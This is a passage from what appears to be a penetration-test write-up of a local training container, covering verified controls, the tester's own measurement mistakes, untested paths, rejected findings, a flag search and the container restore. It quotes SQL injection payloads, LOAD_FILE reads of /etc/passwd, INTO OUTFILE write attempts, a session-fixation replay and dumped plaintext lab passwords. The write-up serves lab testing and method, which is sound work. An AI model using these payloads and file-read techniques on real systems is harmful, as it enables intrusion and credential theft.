| `$isAdmin` role gate on the whole invoice block | `panel.php:14`, `:257` | Fired in **both** directions: `mario` → `200`/5 467 B/`Acceso Denegado`; `admin` → `200`/5 994 B/secret. A gate that only ever produced the denial could not be distinguished from a broken handler. |
| Format validator — **inert, see §2.3** | `panel.php:27-29` | `grep` → 1 hit, the definition. No call site. Not a control. |
| Equal-length generic response | `panel.php:32-46`, comment at `:33` | **Held for 20 of 20** ids that reach it — the 19 non-vulnerable entries of `$database` plus `xyu597` accepted by the `||` at `:273`, all **6 163 B**. It is **defeated by the branch it was meant to hide**: the leak is 5 994 B and "not found" is 5 906 B, two further lengths. A control that holds inside its intended set and emits two more lengths beside it. |
| Unused-password rejection | `bills/index.php:27-28` | Fired: `mario1234` and `admin1234` → 4 787 B `Login fallido`, against 79 B on the correct value. |
| `root@localhost` not exposed off-box | `bills/index.php:3` (`127.0.0.1`) | `nmap -p-` → no 3306; `/proc/net/tcp` → `0100007F:0CEA` = `127.0.0.1:3306` only. The finding is local, and this is why. |
| `LOAD_FILE` refuses what the daemon cannot read | MariaDB | **Fired and refused correctly:** `/etc/passwd` → **1 399 bytes, all 26 accounts**; `/etc/shadow` → `NULL`; `/home/duque/.profile` → `NULL` (mode `0750 duque:duque`, the `mysql` uid is not in that group). The detector reads, so its `NULL` means *denied*, not *broken*. |
| `mysqld` cannot be pointed at root-owned paths | filesystem | 7 of 7 write attempts returned `Errcode: 13`; the 8th returned `ERROR 1086 already exists` with `mtime` unchanged. |
| No `sudo` for `duque` | `/etc/sudoers` | `Sorry, user duque may not run sudo on 74c0aa27e3ec.` — a policy denial, not a wrong password. |
| No Docker socket in the container | — | `/var/run/docker.sock` → `No such file or directory`, so the container-escape class is genuinely absent rather than unmeasured. |
| No `FLAG{}` anywhere | whole filesystem | 30-name `find`, plus `grep -rIl 'FLAG{' /` → see §9, with the search's own false positives read rather than counted. |

---

## 7. Instrumentation defects

Four of my own. Two of them pointed at a real finding and one of those was **wrong in the
most dangerous direction available** — it reported a root-owned write that never
happened.

### 7.1 An existence check reported a root-owned file that the database never wrote

My first write oracle was: attempt `INTO OUTFILE`, then `stat` the path. Against nine
candidates, one line came back:

```
/usr/lib/php/sessionclean  ->  WROTE owner=root(0) mode=755
```

**That is a fabricated privilege escalation.** The SQL had returned
`ERROR 1086 (HY000): File '/usr/lib/php/sessionclean' already exists` — MariaDB refuses
to overwrite, which I had in the same line of output and did not read. The `-f` test then
found the **pre-existing** root-owned file and my code labelled it as my own artefact.
Had I stopped there, this writeup would have filed "the database superuser can overwrite
a root-executed cron helper" as a Critical root escalation. It is false: the file is
`root(0) 755` with `mtime 2022-01-28 00:27:02`, and the daemon that would have written
it runs as uid 103.

This is `method/self-corrections.md` §16 and §11 wearing a new costume: **existence is
not authorship.** Rebuilt as **oracle v3**, which is what §3 F6's table actually reports:

```
[BASELINE] exists_before=YES
[SQL]      ERROR 1086 ... already exists
[AFTER]    exists=YES   owner=root(0)   mtime=2022-01-28 00:27:02  (unchanged)
[MARKER]   0
VERDICT    PREEXISTING-NOT-WRITTEN
```

The fix is the RUNBOOK's own rule: the witness must be **distinguishable by design** — a
uniquely-marked payload plus a pre-existence baseline. Existence is not distinguishable
by design; that is the whole defect.

### 7.2 A rebuilt oracle that measured nothing, and looked like a negative

Fixing 7.1, my second attempt nested `$( )`, `tr` and `%s` substitution through
`paramiko.exec_command` and the quoting collapsed. The output was self-contradictory
(`exists=NO`, `[MARKER] 0`, and the echoed SQL visibly missing its quotes) — **zero work
done**. Read at face value it says "the database wrote nothing anywhere", which would
have been a false negative contradicting the successful `/tmp` write two minutes earlier.

What caught it was that the result **contradicted a measurement I had already made**,
which is the §9 cross-check rule applied to my own batch. Count is zero, so it is
**UNTESTED**, and it is not in §8's negative list. Fixed by base64-encoding the script
and pushing it whole, which removed the quoting hazard instead of fighting it.

### 7.3 Two payloads that agreed because I designed them to

My first SQLi pair was:

```
B1  admin' AND '1'='1   -> 200, 4787 B, Login fallido
B2  admin' AND '1'='2   -> 200, 4787 B, Login fallido
```

Byte-identical. Read naively that is "the boolean does not change the result, so there is
no injection" — and that conclusion would have been **wrong**, because `AND
passwd = 'anything'` was still live in both, so both correctly returned zero rows. My
payloads differed in a literal that could not matter. The error message for a bare quote
(`500`, 0 bytes, with the fatal in `/var/log/apache2/error.log`) had already proven the
quote reached the query; I had proof in hand and drew the wrong conclusion from a badly
designed pair.

The fix was `-- ` to terminate the statement, which is what produced the real
discriminator in §3 F1 (79 B vs 4 787 B). **A uniform answer is a result about the
search** (§5 of the catalogue), and here it was a result about my payload.

### 7.4 A read of the source that would have produced a third finding that does not exist

`bills/index.php:12-14` is unmistakable:

```php
12:     if (!$result) {
13:         // FATAL ERROR: This ensures debugging tools catch the syntax error immediately
14:         die("DATABASE_ERROR: " . mysqli_error($conn));
```

A line whose comment states its purpose is to make SQL errors visible to an attacker.
Filing **"verbose SQL error disclosure, CWE-209"** from that source read alone would have
been a plausible, well-cited, **entirely false finding.** It never fires:

```
$ curl -d "username=admin'&password=x" /bills/index.php
http=500  bytes=0

$ tail -1 /var/log/apache2/error.log
PHP Fatal error:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
… in /var/www/html/bills/index.php:10 … thrown in /var/www/html/bills/index.php on line 10
```

The throw happens at **line 10** — `mysqli_query()` — because PHP 8.1's `mysqli`
defaults to `MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT` and throws on a syntax error.
Control never reaches line 12, so the `die()` on line 14 is **unreachable code**. And
`display_errors=Off` (`error_reporting=22527`), so the client gets **0 bytes**; the text
goes only to the server log.

**The lab ships a disclosure line whose own comment claims it discloses, and it discloses
nothing.** The author wrote a defensive `if (!$result)` that PHP 8.1 makes unreachable,
probably to make the SQLi easier to see during authoring, and the runtime disagreed.
This is a third instance of the corpus's dead-control pattern, and it is the direct
counter-example to "measure what the framework consumes, not what the file contains"
(§21) — here the file contains an error handler and the *framework* never calls it.
Recorded as defect **D3** in §2's family, and it is why F1 has no CWE-209 attached.

### 7.5 The same count, read by two identities, disagreed by one

The setuid sweep in §3 F6 returned **17** binaries when I ran it as `duque` over SSH,
and **18** when I re-ran it as root. The missing one is
`/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool` — a path under a `mysql`-owned
directory that `uid=1000` cannot traverse. I reported **18**, the root-side count,
because the question being asked is "what setuid surface does this host have", and the
`mysql`-owned plugin directory is part of that surface.

This is `method/self-corrections.md` §2 in its mildest form: **the count is a property of
the reader, not only of the filesystem.** Had I kept the `duque`-side 17 and written
"no interesting setuid binary under the database plugin directory" — which is what a
17-count invites — I would have reported an absence created entirely by my own
privilege level, on a target where the database tier is the subject of the engagement.
An enumeration negative now carries its reading identity with it.

---

## 8. NOT tested (a count of zero is untested, not a negative)

Each of these is an untested path, with the reason. None of them is a negative result,
and none of them is evidence of absence.

| Path | Work done | Why untested |
|---|---|---|
| **Delivering the fixated cookie to a victim** | 0 attempts | F4's *hijack* is proven (§4, §3 F4) but I found no XSS in this application to plant a cookie with, so I have no delivery mechanism to test. The open vectors are the missing `Secure` flag over plaintext HTTP and any network position. F4's impact claim stops at the replay for exactly this reason. |
| **Reaching `xyc724` without the admin role** | 0 attempts beyond the 3-case matrix | §2.2 measured the gate closed for the non-admin identity. I did not attempt to defeat `$isAdmin` itself (e.g. a `username` value that survives `strtolower` as `'admin'` while being a different row) — the SQLi already returns the real admin row, so there was no reason to. |
| **MariaDB `root@localhost` via the `unix_socket` plugin** | 0 attempts | Every DB connection in this engagement used `-h 127.0.0.1` over TCP, which is the path F5 is about. Whether a plugin account also exists is unmeasured; `SHOW GRANTS` reported only the two grants quoted in F5, and I did not enumerate the `mysql.global_priv` table. |
| **Non-`xy` identifier formats** | 0 requests | The sweep covered the 26 000 ids matching the format the panel documents. `isValidFormat` is never called (§2.3), so non-matching ids are also processed — but since the leak is a single `===` against one literal, no other shape can reach it. Stated as reasoning, not as a measurement. |
| **Kernel-level escalation** | 0 attempts | `uname -a` reports the **host** kernel `7.0.0-34-generic`, shared with every container on this daemon and newer than this 22.04 userspace. It is not the lab's artefact, so no kernel vector was tested or reported against it. |
| **The other 65 533 closed ports** | 65 535 TCP ports scanned, 2 open | Not a blind spot: `/proc/net/udp` was read directly and holds **zero** UDP sockets, so the UDP class is absent by measurement rather than by TCP-scan blindness. |

---

## 9. Discarded with a reason

Things I looked at and rejected, each with the evidence, so the rejection is checkable
rather than asserted.

| Rejected | Reason |
|---|---|
| **"Error disclosure, CWE-209"** | The disclosure line is unreachable — PHP 8.1's `mysqli` throws at `index.php:10` before the `if` at `:12`. Measured `500`/**0 bytes**; `display_errors=Off`. See §7.4. |
| **"IDOR, CWE-639"** | The non-admin case is a **refusal** (`Acceso Denegado`, 5 467 B), not a cross-user read, and the whole block is behind `$isAdmin` at `:257`. Refuted by the three-case matrix in §4. See §2.2. |
| **"Format validation is bypassable"** | There is nothing to bypass. `isValidFormat` is defined at `:27` and never called — `grep` returns one hit. |
| **"The equal-length response hides nothing"** | It holds for 20 of 20 generic ids at 6 163 B, but the handler emits two further lengths (5 906 B, 5 994 B). It is a real control with a real gap, not a fiction — recorded in §6 rather than as a finding. |
| **"F5 is a root escalation"** | The write lands as `mysql(103)`; `mariadbd`'s own `/proc/132/status` reads `Uid: 103 103 103 103`. 7 of 7 root-consumed paths returned `Errcode: 13`. Refuted with an oracle that fired. See §3 F6. |
| **"The kernel is a lab version"** | `7.0.0-34-generic` is the host's, not the image's. Discarded as a property of the operator's machine. |
| **`/intranet/` and `/empleados/` as an access-control surface** | Both are static `index.html` files that *are* the denial page. There is no server-side check behind them, so there is nothing to bypass and nothing to report. |

---

## 10. Reward

**No `FLAG{}` or equivalent exists.** Re-run against the **restored** container, so the
counts are not polluted by my own probe markers (the pre-restore run returned 6 paths
because 2 of them were files I had written):

| Search | Scope | Result |
|---|---|---|
| `find / -xdev \( -iname '*flag*' -o -iname '*duque*' \)`, excluding `/proc`, `/sys` | whole filesystem | **4** paths: `waitflags.ph`, `ss_flags.ph` (Perl bitmask headers), `debian-10.6.flag` (a MariaDB **packaging** marker, not a challenge file), and `/home/duque` itself. **0** rewards. |
| `grep -rIl 'FLAG{' /` excluding `/proc`, `/sys`, `/dev` | whole filesystem | **0** files. |
| `information_schema.tables` over all non-system schemas | every database | exactly one application table: `register.users`, 3 rows, all read (§3 F1). **0** other tables. |
| `find /home/duque -type f` | the only non-root home | 4 files, all stock dotfiles. |
| hidden files in the docroot | `/var/www/html`, `/bills` | **0** dotfiles. |
| HTTP | 10 paths enumerated in §1.3 | no reward endpoint, no differing body. |
| `/root` | the one root-only directory | `ls -la /root/` → `.bashrc`, `.profile` only. **No reward at root either.** |

**The `grep` negative carries a green positive control**, which is the only reason its
zero is worth reading. The identical command pointed at a string I know is present:

```
$ grep -rIl 'duquelaje81029557' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
/var/www/html/bills/panel.php
```

The instrument finds things. Its `0` for `FLAG{` is a measured absence, not a tool that
looked nowhere.

**A stated boundary.** The name-based `find` and the `FLAG{` grep were run as root
through the host's Docker socket — which is **operator access, not a link in the attack
chain**, and I am not claiming it as a privilege. From the identities the engagement
actually attained, the search reached everything except `/root` and `/etc/shadow`, both
measured as `Permission denied` from `uid=1000`. So the honest statement is: no reward
exists anywhere on the host, including in the two places the attack chain could not look.

Per the corpus's rule, I am reporting the absence and the search that established it.
I am not inventing a reward, and I am not making a claim about the **class** of lab from
a claim about this **instance**. The `FLAG{}` column of [`../INDEX.md`](../INDEX.md) is
the single source for the corpus-wide count, and I make no claim about my position in
any sequence.

---

## 11. Restore

Recreated from the image, not reverted, and verified with **positive** checks:

```
old container: 74c0aa27e3ecd7b7223c54cdc02aaa6c0db06a30f2b8cdfe7e0475d4b181d1ea
docker rm -f duque_container && docker run -d --name duque_container duque:latest
new container: 459bdf80bd548fa323b246b167d0096076f5116755b2102ec786f60ecac4e82b
status=Up    IP=172.17.0.4  (unchanged)
```

| Check | Expected (shipped) | Measured |
|---|---|---|
| `GET /` | `200`, 11 622 B | `200`, **11 622 B** |
| `GET /bills/` | `200`, 4 676 B, login form | `200`, **4 676 B**, marker present |
| `register.users` row count and contents | 3 rows as shipped | `1 Mario mario123`, `2 Jesus jesus2026`, `3 Admin admin123` — **counter back to its shipped value** |
| `GET /bills/panel.php?id=xyc724`, no session | `302` → `/bills/index.php` | `302`, `Location: http://172.17.0.4/bills/index.php` |
| non-system tables | `register.users` only | `register.users` only — my `m2`, `m3`, `duque_marker` are **gone** |
| my files in `/tmp` | none | none (`duque243*`, `oracle243*`, `final243*` all removed) |
| webroot file count | 8 | **8** |

**On my own artefacts:** I removed only files I created, by name. Two of them
(`/tmp/duque243_marker.txt`, `/tmp/duque243_v3.txt`) were owned by `mysql` in a sticky
`/tmp`, so `duque` could not unlink them — they were removed with the container's
destruction, and the listing above confirms none remain. I did not touch anything in
`/tmp` I did not create, and no prune of any kind was run: no `docker system prune`, no
`docker image prune -a`, no `docker volume prune`. The `duque:latest` image is left in
place deliberately — the restore depends on it, and the lab container is **up and
serving**, which is what "restored" means here.

---

## 12. Feed-forward

Against [`../INDEX.md`](../INDEX.md), the classes in this lab are **already covered**,
and the correct outcome is to extend rather than to add:

| Class here | Existing coverage | What this lab adds to the row |
|---|---|---|
| SQLi → auth bypass | 209, 283, 293 | A **UNION** discriminator built from a *measured* column count (1/2/4/5 columns each → `500`/0 B, 3 → `200`/75 B), so the mismatch is visibly an error and not a silent negative. |
| IDOR vs not-IDOR | 85 | The **inverse** case, and it is the useful one: three byte-distinguishable states where the middle one is a **refusal**, which is what refutes the label. 85 proved an IDOR is not merely "unauthenticated"; here the same three-state test proves an admin-gated hardcoded string is not an IDOR at all. |
| Privilege escalation | 129, 141, 146, 189 | The **negative** half with an oracle that fired: a full DBA that stops at uid 103, measured from the daemon's own `/proc`, with 7 of 7 root-consumed write paths denied. |
| Writable-file enumeration | 33, 112, 117 | Two tools agreeing on 5 paths from the same identity (`find -writable` = 4 files, all in `$HOME`; `test -w` = 5 targets, all `no`). |
| Session handling | 172, 271, 293 | The **fixation** primitive, and the first case in this corpus where the replayed SID is proved by *byte count against a never-used control* (5 467 B vs `302`/0 B) rather than by a status code. |
| Lab self-mislabelling | 102, 108, 112, 220 | A **new variant**: the *description* is clean and the **artefact's own comment** is wrong. Extends the row with "check the source comment, not only the catalogue". |
| Dead control in the artefact | 146 | **Second instance**, and a new shape: a defensive error handler made unreachable by the runtime's own defaults (`mysqli` strict mode), so the fix for a 2015-era idiom *silently disabled* the disclosure the author wanted. The only honest way to report it is as a lab defect, not a client finding. |

One **new** rule is proposed, because no existing row covers it and it is the most
transferable thing here:

> **Existence is not authorship.** An oracle that asks "does this path exist now?"
> after performing a write will report a pre-existing file as your own artefact — and
> it reports it with the *victim's* ownership, which is the most attractive possible
> false positive. Every write primitive needs a **pre-existence baseline** and a
> **uniquely-marked payload**; verify by marker and mtime, never by `-f`. When the
> target path already ships (a cron helper, a config file the service reads), the
> write is *refused*, and the refusal is the result.
>
> Corollary: a service that **refuses to overwrite** is a control, and a report that
> says otherwise is a report about `stat`, not about the target.

And one extension to an existing rule, which §7.4 falsifies a naive reading of:

> Rule 3 says *measure what the framework consumes, not what the file contains*. This
> lab is the case where the framework **never calls** the thing the file contains: an
> `if (!$result) { die(mysqli_error($conn)); }` that PHP 8.1 makes unreachable, because
> `mysqli` throws at the call site. The absence of a fired control is a property of the
> runtime, and reading it off the file yields a finding with a plausible CWE and no
> behaviour behind it.
